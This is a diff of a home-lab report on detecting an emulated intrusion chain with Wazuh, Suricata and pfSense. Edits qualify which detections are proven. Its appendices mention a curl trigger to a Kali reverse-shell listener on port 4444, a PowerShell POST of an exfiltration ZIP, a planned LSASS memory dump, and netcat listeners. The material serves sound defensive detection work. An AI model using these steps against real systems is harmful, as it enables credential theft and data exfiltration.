+| P1 | 3 | `100410` has been reparented to `92657` in XML, but `frequency="1"` and mixed historical/current correlation behavior have not been validated | Check `wazuh-analysisd -t` and confirm the installed version's frequency semantics; inspect built-in `92657`, then retest failed SMB logons → one successful 4624 from the same source | A new raw `100410` alert from the **current rule revision**, or an explicit failed test with decoded fields |
+| P1 | 11 | Windows uses `Invoke-WebRequest` to POST a ZIP; committed Kali stock `http.server` does not store POST bodies; no raw Stage 11 alert | Provide a reproducible POST receiver and preserve a received ZIP/hash match; separately verify Windows 4103 and Wazuh `100413` | Matching Windows/Kali SHA256 plus original raw `100413` alert; report transport/detection results independently |
+| P1 | 1 | Same-segment Kali→Windows traffic bypasses pfSense; historical `100140` event is unrelated loopback DNS | Retest endpoint Suricata SID `1000002`/Wazuh `100300`; test pfSense with a distinct WAN-side probe to pfSense itself (without assuming WAN→LAN port-forward) | Raw alert matches actual attack source, target, port and time |
+| P1 | 8b | Sysmon LSASS EID 10 exists, but `100411`/`100416` have no positive validation and allow-list behavior is uncertain | Start with non-destructive `wazuh-logtest` synthetic positive/negative controls; if using memory-access tools, prefer an isolated disposable VM rather than the physical host | Confirm rule matching and acceptable false positives; do not claim real dumping detection without evidence |
+| P2 | all | Group names can appear concatenated (`windowspersistence`, `windowslog_cleared`) | Verify actual `rule.groups`, then normalize outer `<group>` delimiters and retest | Separate `windows`, `persistence`, `log_cleared` values in alerts |
+| P2 | 5 | `100400` may preempt `100402` for `net`/`net1` spawned by a shell | Test current rule ordering and narrow/exclude generic `100400` patterns where necessary | Raw `100402` for intended discovery commands and correlation `100407` |
+| P2 | 11 | MITRE `T1567.002` in `sysmon_rules.xml` and some references suggests cloud storage incorrectly | Map `100413` conservatively to PowerShell execution; describe the transfer technique separately, conditional on actual data path | Doc and XML ATT&CK tags no longer imply cloud storage |
+| P2 | evidence | Some JSON files are condensed excerpts or historical revisions rather than complete raw exports | Label original vs condensed, include rule revision and exact event source; avoid claiming complete raw fidelity | Evidence index identifies provenance and revisions |
+| P3 | 2–3 | SMB re-test proved IP populated; SSH `logonType 8` has a separate source-IP gap | Retest SSH explicitly if SSH correlation is a goal | Relevant `4624`/`4625` `ipAddress` values, or documented limitation |
+| P3 | 6–9 | FIM screenshot or historic signature revision limits strong reproducibility | Preserve additional raw event JSON, sensor version, timestamps and hashes | Stage-specific matching evidence |
+| P3 | all | Clock skew/VM sleep and mixed timezone records can mislead correlation | Record timezone, UTC window and local clock sync status for each future session | Correlated event order supported by synchronized source clocks |
+
+**Status convention:** `Implemented` means the rule/script exists; `Configured` means collection is defined; `Validated` requires a matching, dated alert from that revision; `Transfer verified` additionally requires independently checked file integrity.
 
 ---
 
@@ -777,34 +785,34 @@ The chain was run in three sessions: Stages 1–7 on 2026-08-28, Stages 8–10 o
 
 ## 9. Conclusion
 
-The lab shows that the planned detections can follow an intrusion from the first scan to data theft across several independent sources, and that logs forwarded off the host survive an attacker's cleanup — at the intended severity, once the rule chain is fixed. Three rounds of re-testing (2026-10-10, 2026-10-13) turned the precedence problem from a standing design flaw into a solved, repeatable pattern: Stages 5, 7 and 10 all moved from "a built-in rule fired instead" to "the custom rule fires, confirmed", using the same two fixes (chain under the winning built-in rule, or widen the custom rule's own scope). Stage 3 remains the one open instance of that pattern, with the fix identified but not yet applied. Stage 8b adds a different kind of result: proof the filtering logic correctly suppresses a real false positive (Windows Defender's own LSASS scan), without yet proving it catches a true positive, since no dump tool has been run. What remains is narrower than before: apply the `100410` fix, run an actual LSASS-dump test, finish the WAN-side pfSense re-test, and capture Stage 11. Section 7 lists these in priority order.
+The lab demonstrates multi-source visibility and several validated detections across network, endpoint, firewall, and file/reputation telemetry, **but does not yet establish an uninterrupted, fully detected chain from reconnaissance to data theft**. Retests on 2026-10-10 and 2026-10-13 supplied positive custom-rule evidence for Stages 5, 7 and 10; historical Stage 3 access was classified by built-in `92657`. The **current** `100410` XML is reparented to `92657`, but its correlation syntax and positive result remain unverified. Stage 8b demonstrates that benign Windows Defender LSASS access can be seen without an alert from `100411` for the recorded mask; it does **not** prove all allow-list conditions or positive LSASS-dump detection. Stage 1 and Stage 11 still lack adequate stage-specific evidence. Prioritize those gaps, validate PowerShell Module Logging, and preserve source logs and transfer hashes before calling the full chain confirmed. Section 7 lists the outstanding work.
 
 ---
 
 ## Appendix A — Screenshot Index
 
-Screenshots are stored in the repository under [`screenshot/`](../screenshot/), so the report does not depend on an external host.
+Screenshots are stored in the repository under [`screenshot/`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot), so the report does not depend on an external host.
 
 | Figure | Stage | Date | File |
 |---|---|---|---|
-| 1 | Architecture | — | [`architecture/Architecture-and-data-flow.png`](../architecture/Architecture-and-data-flow.png) |
-| 2 | 1 Reconnaissance | 2026-08-28 | [`Stage1_recon.png`](../screenshot/Stage1_recon.png) |
-| 3 | 2 Brute Force | 2026-08-28 | [`Stage2_bruteforce.png`](../screenshot/Stage2_bruteforce.png) |
-| 4 | 2 Brute Force (preliminary re-test, artifact `ipAddress`) | 2026-10-09 | [`stage2_rule.png`](../screenshot/stage2_rule.png) |
-| 5 | 3 Successful Access | 2026-08-28 | [`Stage3_access.png`](../screenshot/Stage3_access.png) |
-| 6 | 5 Discovery | 2026-08-28 | [`Stage5_discovery.png`](../screenshot/Stage5_discovery.png) |
-| 7 | 5 Discovery (re-test, custom rules confirmed) | 2026-10-13 | [`stage5_evidence.png`](../screenshot/stage5_evidence.png) |
-| 8 | 6 Payload Drop (1/3) | 2026-08-28 | [`Stage6_payload1.png`](../screenshot/Stage6_payload1.png) |
-| 9 | 6 Payload Drop (2/3) | 2026-08-28 | [`Stage6_payload2.png`](../screenshot/Stage6_payload2.png) |
-| 10 | 6 Payload Drop (3/3) | 2026-08-28 | [`Stage6_payload3.png`](../screenshot/Stage6_payload3.png) |
-| 11 | 7 Persistence | 2026-08-28 | [`Stage7_persistence.png`](../screenshot/Stage7_persistence.png) |
-| 12 | 7 Persistence (re-test, custom rule confirmed) | 2026-10-13 | [`stage7_new.png`](../screenshot/stage7_new.png) |
-| 13 | 8 Command and Control | 2026-08-29 | [`Stage8_C2.png`](../screenshot/Stage8_C2.png) |
-| 14 | 8b LSASS (false positive, Windows Defender) | 2026-10-13 | [`stage8b_dump.png`](../screenshot/stage8b_dump.png) |
-| 15 | 9 File Lifecycle | 2026-08-28 | [`Stage9_fim.png`](../screenshot/Stage9_fim.png) |
-| 16 | 10 Anti-Forensics (re-test, custom rule confirmed) | 2026-10-13 | [`stage10_cleanup.png`](../screenshot/stage10_cleanup.png) |
+| 1 | Architecture | — | [`architecture/Architecture-and-data-flow.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/architecture/Architecture-and-data-flow.png) |
+| 2 | 1 Reconnaissance | 2026-08-28 | [`Stage1_recon.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage1_recon.png) |
+| 3 | 2 Brute Force | 2026-08-28 | [`Stage2_bruteforce.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage2_bruteforce.png) |
+| 4 | 2 Brute Force (preliminary re-test, artifact `ipAddress`) | 2026-10-09 | [`stage2_rule.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/stage2_rule.png) |
+| 5 | 3 Successful Access | 2026-08-28 | [`Stage3_access.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage3_access.png) |
+| 6 | 5 Discovery | 2026-08-28 | [`Stage5_discovery.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage5_discovery.png) |
+| 7 | 5 Discovery (re-test, custom rules confirmed) | 2026-10-13 | [`stage5_evidence.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/stage5_evidence.png) |
+| 8 | 6 Payload Drop (1/3) | 2026-08-28 | [`Stage6_payload1.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload1.png) |
+| 9 | 6 Payload Drop (2/3) | 2026-08-28 | [`Stage6_payload2.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload2.png) |
+| 10 | 6 Payload Drop (3/3) | 2026-08-28 | [`Stage6_payload3.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload3.png) |
+| 11 | 7 Persistence | 2026-08-28 | [`Stage7_persistence.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage7_persistence.png) |
+| 12 | 7 Persistence (re-test, custom rule confirmed) | 2026-10-13 | [`stage7_new.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/stage7_new.png) |
+| 13 | 8 Command and Control | 2026-08-29 | [`Stage8_C2.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage8_C2.png) |
+| 14 | 8b LSASS (false positive, Windows Defender) | 2026-10-13 | [`stage8b_dump.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/stage8b_dump.png) |
+| 15 | 9 File Lifecycle | 2026-08-28 | [`Stage9_fim.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage9_fim.png) |
+| 16 | 10 Anti-Forensics (re-test, custom rule confirmed) | 2026-10-13 | [`stage10_cleanup.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/stage10_cleanup.png) |
 
-Stage 4 and Stage 11 have no screenshots; their evidence is the raw alert, or nothing yet for Stage 11. Stage 3's 2026-10-10 re-test (`92657`, `67028`, `60122` sequence) and the Discover search that found no `100410` are documented from raw JSON and Discover observation, not a saved screenshot.
+Stage 4 and Stage 11 have no screenshots; Stage 4 has a stored raw alert, while Stage 11 has no preserved raw alert or completed transfer evidence. Stage 3's 2026-10-10 re-test (`92657`, `67028`, `60122` sequence) and the Discover search that found no `100410` are documented from raw JSON and Discover observation, not a saved screenshot.
 
 ---
 
@@ -816,14 +824,14 @@ Everything the emulation leaves behind, with the command that removes it.
 |---|---|---|---|
 | Registry value `UpdaterSvc` | 7 | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdaterSvc /f` |
 | EICAR files | 6, 9 | `C:\Users\LENOVO\Downloads\virustotaltest\` | Delete the files in the folder |
-| LSASS memory dump (contains credential material) | 8b | `C:\Windows\Temp\lsass_test.dmp` | `del C:\Windows\Temp\lsass_test.dmp`, then confirm it is gone |
+| LSASS memory dump (**not created in documented test**) | 8b planned | `C:\Windows\Temp\lsass_test.dmp` (planned only) | If separately tested on an isolated VM, securely delete the dump |
 | Exfiltration archive | 11 | `C:\Windows\Temp\exfil_test.zip` | `del C:\Windows\Temp\exfil_test.zip` |
 | Locked account `LENOVO` | 2, 3 | Windows local accounts | `net user lenovo /active:yes` |
 | Cleared Security log | 10 | Windows Security log | Not recoverable on the host; the history remains in Wazuh |
-| Received archive, packet capture, Hydra state | 0, 11 | Kali home directory | Delete `received_exfil.zip`, `full_chain_*.pcap`, `hydra.restore` |
-| Listeners | 6, 8, 11 | Kali ports `8000`, `4444`, `4445` | Stop `http.server` and the `nc` listeners |
+| Received archive (**not evidenced**), packet capture, Hydra state | 0, 11 | Kali home directory | Delete any files **actually created** during testing; `received_exfil.zip` is only an expected future artifact |
+| Listeners | 6, 8, 11 | Kali ports `8000`, `4444`; `4445` remains a legacy Stage 11 script line | Stop running processes; `nc :4445` is not part of the current Windows HTTP POST path |
 
-**Indicators for hunting this emulation:** Kali `192.168.60.135`; ports `8000`, `4444`, `4445`; Run value `UpdaterSvc`; `procdump.exe` accessing `lsass.exe`; Event `1102` on the endpoint.
+**Indicators for hunting this emulation:** Kali `192.168.60.135`; port `4444` (Stage 8 reverse shell) and HTTP port `8000` (Stage 11 planned POST); `4445` is a **legacy Stage 11 marker**; Run value `UpdaterSvc`; Event `1102` on the endpoint. `procdump.exe` was **not executed** in the recorded tests.
 
 ---
 
@@ -834,19 +842,18 @@ Everything the emulation leaves behind, with the command that removes it.
 | Stage 4 | The original sample used `-EncodingCommand`, which is not a valid PowerShell parameter | Use `-EncodedCommand`, as the captured log shows |
 | Stage 5 | Typo `whoammi` | `whoami` |
 | Stage 6 | The original command used `-0` (HTTP/1.0 switch) before the output path | Use `-o` to write the file |
-| Stages 6 and 9 | File names differ (`eicar2.com` created, `eicar2.txt` deleted) | Use one set of names |
+| ~~Stages 6 and 9~~ | ~~File names differ~~ | **Resolved** — all three steps use `eicar2.com` |
 | Stage 3 | Expected logon type depends on the OpenSSH configuration | Record the logon type seen in the event |
 | Stage 8 | Alternative trigger `curl http://192.168.60.135:4444` | Produces the same outbound connection to port `4444` |
-
 
 ---
 
 ## Appendix D — Raw Evidence Logs and Attack Scripts
 
-Every alert referenced in Section 4 is committed as raw JSON under
-[`threat-emulation/evidence-logs/`](../threat-emulation/evidence-logs/), and
+Most event evidence discussed in Section 4 is preserved under
+[`threat-emulation/evidence-logs/`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/), and
 every command run during the chain is committed as a runnable script under
-[`threat-emulation/attack-scripts/`](../threat-emulation/attack-scripts/).
+[`threat-emulation/attack-scripts/`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/attack-scripts/).
 Each log file is plain JSON (one alert per file); its status (verified, condensed
 excerpt, rule mismatch) is recorded in the index linked at the end of this appendix.
 
@@ -864,14 +871,11 @@ excerpt, rule mismatch) is recorded in the index linked at the end of this appen
 | 8b Credential Access | `08b-credential-access_windows.cmd` | `stage08b-rule-100411-lsass-excerpt.json`, `stage08b-rule-100411-lsass-false-positive-windowsdefender.json` |
 | 9 File Lifecycle | `09-file-lifecycle_windows.ps1` | — (screenshot only, Figure 15) |
 | 10 Anti-Forensics | `10-anti-forensics_windows.ps1` | `stage10-windows-1102-log-cleared.json`, `stage10-rule-100412-excerpt.json` |
-| 11 Exfiltration | `11-exfiltration_kali.sh`, `11-exfiltration_windows.ps1` | — (not yet evidenced) |
+| 11 HTTP Transfer / Exfiltration Simulation | `11-exfiltration_kali.sh`, `11-exfiltration_windows.ps1` (`Invoke-WebRequest` POST; stock server has no upload handler) | — (not yet evidenced) |
 
 Five further logs sit under `threat-emulation/evidence-logs/` as supplementary
-baseline evidence, not tied to a specific chain stage: `baseline-pfsense-udp-allowed.json`,
-`baseline-pfsense-icmp-mismatch.json`, `baseline-pfsense-synburst-example1.json`,
-`baseline-pfsense-synburst-e2e.json`, `baseline-suricata-portscan.json`, and
-`stage08-suricata-reverse-shell-baseline-test.json` (the first reverse-shell
+baseline evidence, not tied to a specific chain stage: `baseline-pfsense-udp-allowed.json`, `baseline-pfsense-icmp-mismatch.json`, `baseline-pfsense-synburst-example1.json`, `baseline-pfsense-synburst-e2e.json`, `baseline-suricata-portscan.json`, and `stage08-suricata-reverse-shell-baseline-test.json` (the first reverse-shell
 rule test, run before the chain).
 
 Each stage's evidence-log status (verified / condensed / mismatched) is
-indexed in [`threat-emulation/evidence-logs/README.md`](../threat-emulation/evidence-logs/README.md).
+indexed in [`threat-emulation/evidence-logs/README.md`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/README.md).
